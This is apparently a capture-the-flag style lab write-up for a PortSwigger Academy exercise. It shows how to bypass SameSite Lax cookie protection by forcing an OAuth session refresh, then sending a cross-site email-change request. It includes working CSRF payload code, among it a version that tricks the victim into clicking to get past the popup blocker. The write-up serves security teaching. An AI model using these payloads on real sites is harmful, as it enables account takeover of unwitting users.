![image](https://github.com/udayk01/Web-Security/assets/52235763/05c14125-1bdf-48aa-a292-3c2dd66ee45c)

## Solution:

### Study the change email function

> In Burp's browser, log in via your social media account and change your email address.

![image](https://github.com/udayk01/Web-Security/assets/52235763/e5b53115-6fa8-4415-8660-ce2561c2a4fa)

> In Burp, go to the Proxy > HTTP history tab.

> Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions.

![image](https://github.com/udayk01/Web-Security/assets/52235763/7bd42ac5-952f-45c1-b9cf-958430c34493)

> Look at the response to the GET /oauth-callback?code=[...] request at the end of the OAuth flow. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level.

![image](https://github.com/udayk01/Web-Security/assets/52235763/fe6c3576-26a8-4685-801a-9178fd721246)

### Attempt a CSRF attack

> In the browser, go to the exploit server.

> Use the following template to create a basic CSRF attack for changing the victim's email address:
```
<script>
    history.pushState('', '', '/')
</script>
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="foo@bar.com" />
    <input type="submit" value="Submit request" />
</form>
<script>
    document.forms[0].submit();
</script>
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/01010eee-d097-4b00-9d12-9fca2e1502bd)

> Store and view the exploit yourself. What happens next depends on how much time has elapsed since you logged in:

![image](https://github.com/udayk01/Web-Security/assets/52235763/00d417ce-bf7b-4096-9595-e821006a69c4)

> If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately.

> If you logged in less than two minutes ago, the attack is successful and your email address is changed. From the Proxy > HTTP history tab, find the POST /my-account/change-email request and confirm that your session cookie was included even though this is a cross-site POST request.

![image](https://github.com/udayk01/Web-Security/assets/52235763/f41ea241-b7ef-4c3f-bb0e-c6f818cc6d96)

### Bypass the SameSite restrictions

> In the browser, notice that if you visit /social-login, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction.

![image](https://github.com/udayk01/Web-Security/assets/52235763/b2fb2e8b-ede1-44dd-af9b-275731b173d1)

> From the proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.

![image](https://github.com/udayk01/Web-Security/assets/52235763/ed5866a9-ca3c-4b13-a854-983c90584e34)

> Go back to the exploit server.

> Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit /social-login, then submits the email change request after a short pause. The following is one possible approach:
```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@web-security-academy.net">
</form>
<script>
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/79a7fbab-ea6a-46cb-9b09-06bbdd706868)

> Note that we've opened the /social-login in a new window to avoid navigating away from the exploit before the change email request is sent.

> Store and view the exploit yourself. Observe that the initial request gets blocked by the browser's popup blocker.

![image](https://github.com/udayk01/Web-Security/assets/52235763/e419c2ae-4ec9-4bf6-b722-0af6e8faa1e6)

>> Observe that, after a pause, the CSRF attack is still launched. However, this is only successful if it has been less than two minutes since your cookie was set. If not, the attack fails because the popup blocker prevents the forced cookie refresh.

### Bypass the popup blocker

> Realize that the popup is being blocked because you haven't manually interacted with the page.

> Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked. The following is one possible approach:
```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/f2815ad1-bca3-46a7-b53f-0cc4d402a606)

> Test the attack on yourself again while monitoring the proxy history in Burp.

![image](https://github.com/udayk01/Web-Security/assets/52235763/c7a6237b-0f54-43ef-bc70-e624e8051611)

> When prompted, click the page. This triggers the OAuth flow and issues you a new session cookie. After 5 seconds, notice that the CSRF attack is sent and the POST /my-account/change-email request includes your new session cookie.

![image](https://github.com/udayk01/Web-Security/assets/52235763/d5b9ded2-b362-4d44-936f-d7d36631fa8a)

> Go to your account page and confirm that your email address has changed.

> Change the email address in your exploit so that it doesn't match your own.

![image](https://github.com/udayk01/Web-Security/assets/52235763/1b94435a-0b39-4a6d-8029-b3715dd422b4)

> Deliver the exploit to the victim to solve the lab.

![image](https://github.com/udayk01/Web-Security/assets/52235763/c81d557b-6f1e-4f62-b674-21a4b43fbd6a)
